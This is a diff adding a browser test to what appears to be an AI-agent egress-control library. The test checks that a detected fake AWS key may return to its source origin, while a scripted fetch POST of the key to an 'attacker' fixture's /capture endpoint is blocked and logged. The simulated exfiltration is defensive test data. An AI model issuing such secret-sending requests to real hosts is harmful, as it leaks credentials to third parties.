@@ -120,6 +120,76 @@ describe("M4 combined data-control gate", () => {
       await fixtures.close();
     }
   });
+
+  it("blocks a page-A detected value at unrelated B while allowing its source origin", async () => {
+    const fixtures = await startFixtureServer();
+    const page = await browser.newPage();
+    const [source, attacker] = fixtures.origins;
+    if (source === undefined || attacker === undefined) throw new Error("fixture origins missing");
+    const detected = `AKIA${"7".repeat(16)}`;
+    try {
+      await page.goto(`${source.origin}/secret-form`);
+      await page.locator("body").evaluate((body, value) => {
+        body.insertAdjacentHTML("beforeend", `<p id="source-value">${value}</p>`);
+      }, detected);
+      const session = new OpenAgentFence({
+        adapter: playwrightAdapter(page, { routeRequests: true }),
+        scanners: [createSecretSensitiveScanner()],
+        policy: networkPolicy(),
+      }).start({
+        task: "return detected account data only to its source",
+        capabilities: {
+          externalCommunication: true,
+          privateNetwork: true,
+          navigation: "allowlist",
+        },
+        origins: { allow: [source.origin, attacker.origin] },
+      });
+
+      const perception = await session.observe();
+      expect(perception.sanitizedText.value).not.toContain(detected);
+      await page.evaluate(([url, value]) => fetch(url, { method: "POST", body: value }), [
+        `${source.origin}/capture`,
+        detected,
+      ] as const);
+      await expect
+        .poll(() => fixtures.requests.filter((request) => request.body.includes(detected)).length)
+        .toBe(1);
+
+      const attackerBefore = fixtures.requests.filter(
+        (request) => request.origin === attacker.origin,
+      ).length;
+      let blockedError: unknown;
+      try {
+        await page.evaluate(([url, value]) => fetch(url, { method: "POST", body: value }), [
+          `${attacker.origin}/capture`,
+          detected,
+        ] as const);
+      } catch (error) {
+        blockedError = error;
+      }
+      expect(blockedError).toBeInstanceOf(Error);
+      expect(
+        fixtures.requests.filter((request) => request.origin === attacker.origin),
+      ).toHaveLength(attackerBefore);
+
+      const trace = await session.end();
+      expect(validateTraceDocument(trace).ok).toBe(true);
+      expect(expectNoRawSecretIn([perception, blockedError, trace], detected)).toBe(true);
+      expect(
+        trace.events.some(
+          (event) =>
+            event.kind === "egress_inspection" &&
+            event.data["verdict"] === "block" &&
+            Array.isArray(event.data["reasons"]) &&
+            event.data["reasons"].includes("sensitive_value_in_egress"),
+        ),
+      ).toBe(true);
+    } finally {
+      await page.close();
+      await fixtures.close();
+    }
+  });
 });
 
 function networkPolicy(): PolicyEngine {
